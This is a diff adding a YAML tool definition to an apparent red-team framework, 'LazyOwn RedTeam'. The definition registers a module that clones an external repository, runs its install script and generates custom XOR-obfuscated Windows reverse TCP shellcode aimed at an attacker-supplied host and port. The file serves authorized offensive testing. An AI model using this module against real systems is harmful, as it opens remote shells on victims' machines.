@@ -1,0 +1,21 @@
+name: shellcode_custom_win_rev_tcp_xored
+description: >
+  win_shellcode shellcode in windows custom (no msfvenom) and xored
+author: "LazyOwn RedTeam"
+version: "1.0"
+enabled: true
+params:
+  - name: lhost
+    type: string
+    required: true
+    description: lhost target.
+  - name: lport
+    type: string
+    required: true
+    description: lport to operate.
+tool:
+  name: shellcode_custom_win_rev_tcp_xored
+  repo_url: git@github.com:grisuno/win_shellcode.git
+  install_path: external/.exploit/win_shellcode
+  install_command: chmod +x install.sh && ./install.sh
+  execute_command: python3 app.py 0x33 {lhost} {lport}
